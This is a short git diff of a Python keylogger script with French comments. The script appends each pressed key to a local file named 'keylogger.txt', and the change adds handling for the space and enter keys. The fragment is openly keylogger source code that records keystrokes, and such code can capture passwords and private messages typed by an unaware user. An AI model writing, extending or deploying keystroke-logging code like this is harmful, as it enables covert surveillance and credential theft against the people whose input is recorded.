@@ -9,13 +9,13 @@ def onPush(key):
     try:
         with open("keylogger.txt", "a") as f:
             f.write(f"{key.char}")  # on gere les touches alphanumeriques
-    except AttributeError as e: # on decide de gerer les autres touches
+    except AttributeError as e:  # on decide de gerer les autres touches
         if key == keyboard.Key.space:
+            with open("keylogger.txt", "a") as f:
+                f.write(" ")  # on ecrit un espace
+        if key == keyboard.Key.enter:
             with open("keylogger.txt","a") as f:
-                f.write(" ")    # on ecrit un espace
-
-
-
+                f.write("\n")   # on ecrit dans le fichier un saut à la ligne
 
 
 if __name__ == "__main__":
